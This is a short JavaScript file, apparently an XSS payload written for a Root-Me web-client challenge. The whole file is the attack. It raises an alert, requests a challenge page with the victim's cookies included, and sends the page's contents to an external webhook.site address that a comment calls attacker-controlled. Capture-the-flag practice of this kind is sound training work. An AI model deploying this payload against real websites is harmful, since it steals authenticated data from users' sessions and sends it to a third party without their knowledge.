// color.js
(function () {
  alert("XSS Triggered!");
  fetch("http://challenge01.root-me.org/web-client/ch62/", {
    credentials: "include", // Include cookies in the request
    method: "GET",
  })
    .then((response) => response.text())
    .then((data) => {
      // Send the server's response to the attacker-controlled server
      fetch("	https://webhook.site/2a3874ec-1d9a-40c1-8e4f-ab8d8d3f8d0d", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ response: data }),
      });
    })
    .catch((err) => console.error(err));
})();
